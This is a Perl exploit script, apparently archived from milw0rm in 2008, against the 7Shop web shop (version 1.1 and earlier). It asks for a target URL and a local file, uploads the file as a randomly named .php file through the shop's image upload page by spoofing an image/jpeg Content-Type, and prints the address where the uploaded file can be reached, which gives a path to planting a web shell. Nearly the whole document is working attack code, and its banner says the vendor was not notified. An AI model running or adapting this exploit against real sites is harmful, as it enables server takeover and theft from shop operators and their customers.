#!/usr/bin/perl

use warnings;
use strict;
use LWP::UserAgent;
use HTTP::Request::Common;

my $fname = rand(1000) . ".php"; # int.. yes i know PU!

print <<INTRO;
+++++++++++++++++++++++++++++++++++++++++++++++++++++
+     7Shop <= 1.1 Remote Arbitrary File Upload     +
+             [Content-Type] -> Spoofing            +
+         Discovered && Coded By: t0pP8uZz          +
+                                                   +
+        Contact IRC: irc.rizon.net #sectalk        +
+ Vendor not notified! Later versions maybe vuln!   +
+                                                   +
+   Discovered On: 25 October 2008 / milw0rm.com    +
+                                                   +
+          Script Download: http://7shop.de         +
+++++++++++++++++++++++++++++++++++++++++++++++++++++
INTRO

print "\nEnter URL(ie: http://site.com/shop): ";
    chomp(my $url=<STDIN>);
    
print "\nEnter File Path(path to local file to upload): ";
    chomp(my $file=<STDIN>);

my $ua = LWP::UserAgent->new;
my $re = $ua->request(POST $url.'/includes/imageupload.php',
                      Content_Type => 'form-data',
                      Content      => [ img1 => [ $file, $fname, Content_Type => 'image/jpeg' ], ] );

die "HTTP POST Failed!" unless $re->is_success;

if($re->content =~ /File is valid/) {
    
    print "File successfully uploaded! Access your file here: " . $url . "/images/artikel/" . $fname . "\n"; # say()? nah you havent got perl510 yet. have you!
}
elsif($re->content =~ /The requested URL/) { # apache debug only
    
    print "File Upload Failed! The requested target was not running a vulnerable version of 7shop!\n";
}
else {
    
    print "File Upload Failed! target vulnerable, but upload failed.. try changing filename.\n";
}
exit;

# milw0rm.com [2008-10-29]
